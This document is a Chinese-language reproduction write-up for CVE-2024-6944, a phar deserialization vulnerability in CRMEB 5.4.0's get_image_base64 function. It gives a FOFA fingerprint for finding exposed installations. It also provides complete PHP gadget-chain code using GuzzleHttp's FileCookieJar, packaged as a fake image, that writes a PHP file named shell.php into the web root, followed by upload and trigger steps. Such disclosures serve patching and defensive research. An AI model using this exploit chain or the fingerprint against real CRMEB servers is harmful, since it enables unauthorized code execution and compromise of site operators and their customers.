# CRMEB电商系统PublicController.php反序列化漏洞(CVE-2024-6944)

钟邦科技CRMEB 5.4.0版本中发现一个关键漏洞。受影响的是PublicController.php文件中的get_image_base64函数。参数文件的操作会导致反序列化。攻击可能远程发起。该漏洞已被公开披露并可能被利用。

## fofa

```javascript
icon_hash="-847565074"
```

## 漏洞复现

生成phar文件并gzip压缩

```php
<?php

namespace GuzzleHttp\Cookie{

    class SetCookie {

        function __construct()
        {
            $this->data['Expires'] = '<?php phpinfo();?>';
            $this->data['Discard'] = 0;
        }
    }

    class CookieJar{
        private $cookies = [];
        private $strictMode;
        function __construct() {
            $this->cookies[] = new SetCookie();
        }
    }

    class FileCookieJar extends CookieJar {
        private $filename;
        private $storeSessionCookies;
        function __construct() {
            parent::__construct();
            $this->filename = "D:/phpstudy/WWW/crmeb/public/shell.php";
            $this->storeSessionCookies = true;
        }
    }
}

namespace{
    $exp = new GuzzleHttp\Cookie\FileCookieJar();

    $phar = new Phar('test.phar');
    $phar -> stopBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($exp);
    $phar -> stopBuffering();
    rename('test.phar','test.jpg');
}

?>
```

gzip压缩文件

```php
gzip test.jpg
```

注册用户上传头像

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410250941110.png)

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410250941888.png)

触发phar反序列化

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410250942476.png)

成功写入

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410250942596.png)



## 漏洞来源

- https://forum.butian.net/article/610